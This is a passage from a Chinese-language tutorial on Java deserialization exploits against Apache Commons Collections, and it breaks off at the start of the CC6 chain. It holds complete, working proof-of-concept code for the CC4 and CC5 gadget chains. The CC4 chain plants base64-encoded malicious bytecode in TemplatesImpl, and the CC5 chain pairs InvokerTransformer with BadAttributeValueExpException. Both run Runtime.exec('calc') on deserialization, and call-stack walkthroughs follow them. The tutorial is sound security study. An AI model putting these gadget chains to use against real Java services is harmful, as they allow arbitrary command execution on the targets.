上面 CC2 说了因为 CommonsCollections4 除4.0的其他版本去掉了 InvokerTransformer 的 Serializable
继承，导致无法序列化。所以我们是否可以不使用 InvokerTransformer 呢？于是便有了 CC4，CC4 只是将 CC2 中的
InvokerTransformer 替换为了 InstantiateTransformer。
    package Apache_Common_Collections.cc_1_7;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InstantiateTransformer;
    import javax.xml.transform.Templates;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    //与cc2类似
    //InvokeTransformer 变为 InstantiateTransformer
    public class CommonsCollections4 {
        public static void main(String[] args) {
            try{
                //字节码
                byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
                //反射设置 Field
                TemplatesImpl templates = new TemplatesImpl();
                setFieldValue(templates, "_bytecodes", new byte[][]{code});
                setFieldValue(templates, "_name", "HelloTemplatesImpl");
                setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());
                //Transformer数组
                Transformer[] transformers = new Transformer[] {
                        new ConstantTransformer(TrAXFilter.class),
                        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
                };
                ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
                //TransformingComparator 实例
                TransformingComparator comparator = new TransformingComparator(chainedTransformer);
                //PriorityQueue 实例
                PriorityQueue priorityQueue = new PriorityQueue(2);
                //先设置为正常变量值，后面可以通过setFieldValue修改
                priorityQueue.add(1);
                priorityQueue.add(1);
                //反射设置 Field
                Object[] objects = new Object[]{templates, templates};
                setFieldValue(priorityQueue, "queue", objects);
                setFieldValue(priorityQueue, "comparator", comparator);
                //序列化
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(baos);
                oos.writeObject(priorityQueue);
                oos.flush();
                oos.close();
                //测试反序列化
                ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
                ObjectInputStream ois = new ObjectInputStream(bais);
                ois.readObject();
                ois.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        //反射设置 Field
        public static void setFieldValue(Object object, String fieldName, Object value) {
            try {
                Field field = object.getClass().getDeclaredField(fieldName);
                field.setAccessible(true);
                field.set(object, value);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
大体调用栈：
    ->PriorityQueue.readObject()
          ->PriorityQueue.heapify()
              ->PriorityQueue.siftDown()
                ->PriorityQueue.siftDownUsingComparator()
                     ->TransformingComparator.compare()
                        ->ChainedTransformer.transform()
                            ->ConstantTransformer.transform()
                                        ->InstantiateTransformer.transform()
                                 ->TrAXFilter.TrAXFilter()
                                     ->TemplatesImpl.newTransformer()
                                            ->…………
### 六、CC5
* * *
**测试环境** ：3.1-3.2.1，jdk1.8
这里我们又回到了去触发 LazyMap.get()，只不过我们改变了 LazyMap.get() 的触发方式，不再和 CC1 和 CC3 一样借助
AnnotationInvocationHandler 的反序列化触发。
这里引入新类 TiedMapEntry：
    public class TiedMapEntry implements Entry, KeyValue, Serializable {
        private static final long serialVersionUID = -8453869361373831205L;
        private final Map map;
        private final Object key;
        //构造函数，显然我们可以控制 this.map 为 LazyMap
        public TiedMapEntry(Map map, Object key) {
            this.map = map;
            this.key = key;
        }
        //toString函数，注意这里调用了 getValue()
        public String toString() {
            return this.getKey() + "=" + this.getValue();
        }
        //跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()
        public Object getValue() {
            return this.map.get(this.key);
        }
    }
综上，通过 TiedMapEntry.toString() 可触发 LazyMap.get()
那么有没有一个类可以在反序列化时触发 TiedMapEntry.toString() 呢？ BadAttributeValueExpException！
    public class BadAttributeValueExpException extends Exception   {
        private Object val;     //这里可以控制 val 为 TiedMapEntry
        private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
            ObjectInputStream.GetField gf = ois.readFields();
            Object valObj = gf.get("val", null);
            if (valObj == null) {
                val = null;
            } else if (valObj instanceof String) {
                val= valObj;
            } else if (System.getSecurityManager() == null
                    || valObj instanceof Long
                    || valObj instanceof Integer
                    || valObj instanceof Float
                    || valObj instanceof Double
                    || valObj instanceof Byte
                    || valObj instanceof Short
                    || valObj instanceof Boolean) {
                val = valObj.toString();    //这里是关键点，调用toString()
            } else {
                val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
            }
        }
    }
最终实现代码：
    package Apache_Common_Collections.cc_1_7;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import javax.management.BadAttributeValueExpException;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Map;
    public class CommonsCollections5 {
        public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
            //Transformer数组
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
            };
            //ChainedTransformer实例
            Transformer chainedTransformer = new ChainedTransformer(transformers);
            //LazyMap实例
            Map uselessMap = new HashMap();
            Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);
            //TiedMapEntry 实例
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"test");
            //BadAttributeValueExpException 实例
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            //反射设置 val
            Field val = BadAttributeValueExpException.class.getDeclaredField("val");
            val.setAccessible(true);
            val.set(badAttributeValueExpException, tiedMapEntry);
            //序列化
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(badAttributeValueExpException);
            oos.flush();
            oos.close();
            //测试反序列化
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();
        }
    }
大体调用栈：
    ->BadAttributeValueExpException.readObject()
          ->TiedMapEntry.toString()
              ->TiedMapEntry.getValue()
                ->LazyMap.get()
                    ->ChainedTransformer.transform()
                        ->ConstantTransformer.transform()
                                ->InvokerTransformer.transform()
                                    ->…………
### 七、CC6
* * *
**测试环境** ：3.1-3.2.1，jdk1.7,1.8
CC5 用了 BadAttributeValueExpException 反序列化去触发 LazyMap.get()，除了
BadAttributeValueExpException 、AnnotationInvocationHandler 还有其他方法吗？ HashMap!
我们再研究研究 TiedMapEntry 这个类
    public class TiedMapEntry implements Entry, KeyValue, Serializable {
        private static final long serialVersionUID = -8453869361373831205L;
        private final Map map;
        private final Object key;
        //构造函数，显然我们可以控制 this.map 为 LazyMap
        public TiedMapEntry(Map map, Object key) {
            this.map = map;
            this.key = key;
        }
        //hashCode函数，注意这里调用了 getValue()
        public int hashCode() {
            Object value = this.getValue();